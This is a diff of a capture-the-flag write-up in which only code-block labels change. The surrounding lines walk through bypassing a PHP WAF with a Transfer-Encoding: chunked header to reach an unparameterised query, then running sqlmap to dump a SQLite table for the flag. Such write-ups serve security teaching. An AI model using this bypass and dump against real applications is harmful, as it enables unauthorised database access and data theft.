@@ -63,9 +63,9 @@ Play with the search bar and know how it works, then test it for vulnerabilities
 
 While navigating through files if you looked at Cursor.php you’ll see two functions unsafequery and safequery the unsafequery function that takes $pdo, $id arguments and execute it inside a SQL query and there is no existence for a prepared statement but the safequery function takes the same arguments and execute it inside a SQL query but in a prepared statement.
 
-`Note: If you don’t know what is a prepared statement, you can read about it here → https://www.w3schools.com/php/php_mysql_prepared_statements.asp`
+`Note` If you don’t know what is a prepared statement, you can read about it here → https://www.w3schools.com/php/php_mysql_prepared_statements.asp
 
-```file.php
+```terminal
 <?php
 require_once 'Connect.php';
 
@@ -111,7 +111,7 @@ Seems like a WAF is being used (Actually you already know from the waf.php file 
 
 Let’s navigate through `waf.php`
 
-```waf.php
+```terminal
 <?php
 function waf_sql_injection($input)
 {
@@ -175,7 +175,7 @@ But how we can bypass this WAF and reach the unsafequery function?
 
 While analyzing `SearchHandler.php`, we’ll see this if statement
 
-```SearchHandler.php
+```terminal
 if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
 {
     $search = $_POST['search'];
@@ -204,7 +204,7 @@ If we included the Transfer-Encoding: Chunked header in our request, we’ll rea
 
 Request I used:
 
-```HTTP
+```
 POST /Controllers/Handlers/SearchHandler.php HTTP/1.1
 Host: host
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -229,7 +229,7 @@ sqlmap -r request --risk=3 --level=5 --dbms=sqlite --ignore-code=500 --dump -T p
 ```
 `sqlmap` will detect it's a blind SQL injection:
 
-```SQLmap
+```terminal
 sqlmap resumed the following injection point(s) from stored session:
 
 Parameter: search (POST)
@@ -246,7 +246,7 @@ back-end DBMS: SQLite
 ```
 After a few minutes, you’ll get the flag.
 
-```
+```terminal
 Database: <current>
 Table: posts
 [6 entries]
